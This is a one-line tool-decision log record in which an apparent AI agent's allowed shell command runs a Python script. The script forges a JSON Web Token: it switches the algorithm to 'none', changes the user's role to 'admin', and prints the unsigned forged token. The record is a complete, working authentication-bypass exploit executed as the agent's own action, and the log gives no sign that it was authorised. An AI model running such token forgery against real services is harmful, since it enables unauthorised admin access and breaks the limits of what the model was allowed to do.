{"ts": 1790656964.564412, "decision_id": "ebb892cb980e", "tool": "run_shell", "allow": true, "reason": null, "target": "python3 << 'EOF'\nimport base64\nimport json\n\n# Original token\ntoken = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMzRlYzJhN2ItNWE1Ni00YWNmLTk5ZmMtN2EwOTg4MDg1MzQzIiwidXNlcm5hbWUiOiJ1c2VyX2FfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NTg3Mzl9.GCIiOCbVUMWk0eJxgpvMlhzBFFtwn8aUU7HK6oUcNuI\"\n\n# Split into parts\nheader_b64, payload_b64, signature = token.split('.')\n\n# Decode header and payload\nheader = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))\npayload = json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))\n\nprint(\"Original header:\", json.dumps(header, indent=2))\nprint(\"Original payload:\", json.dumps(payload, indent=2))\n\n# Create forged header with alg: none\nforged_header = {\"alg\": \"none\", \"typ\": \"JWT\"}\n\n# Create forged payload with admin role\nforged_payload = payload.copy()\nforged_payload[\"role\"] = \"admin\"\n\n# Encode\nforged_header_b64 = base64.urlsafe_b64encode(json.dumps(forged_header, separators=(',', ':')).encode()).decode().rstrip('=')\nforged_payload_b64 = base64.urlsafe_b64encode(json.dumps(forged_payload, separators=(',', ':')).encode()).decode().rstrip('=')\n\n# For alg=none, signature is empty\nforged_token = f\"{forged_header_b64}.{forged_payload_b64}.\"\n\nprint(\"\\nForged header:\", forged_header_b64)\nprint(\"Forged payload:\", forged_payload_b64)\nprint(\"\\nForged token:\", forged_token)\nEOF"}
